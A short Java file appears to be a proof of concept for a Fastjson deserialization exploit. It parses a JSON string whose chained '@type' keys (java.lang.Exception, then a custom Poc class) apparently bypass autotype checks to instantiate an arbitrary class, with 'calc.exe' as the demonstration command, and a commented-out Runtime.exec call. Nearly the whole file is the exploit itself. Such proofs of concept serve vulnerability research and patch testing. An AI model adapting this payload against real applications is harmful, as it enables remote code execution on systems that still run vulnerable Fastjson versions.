package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.IOException;

public class PocDemo {
    public static void main(String[] args) throws IOException {
        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"org.example.Poc\",\"name\":\"calc.exe\"}";
        JSON.parseObject(json);
        //JSON.parse(json);
        //Runtime.getRuntime().exec("calc.exe");

    }
}
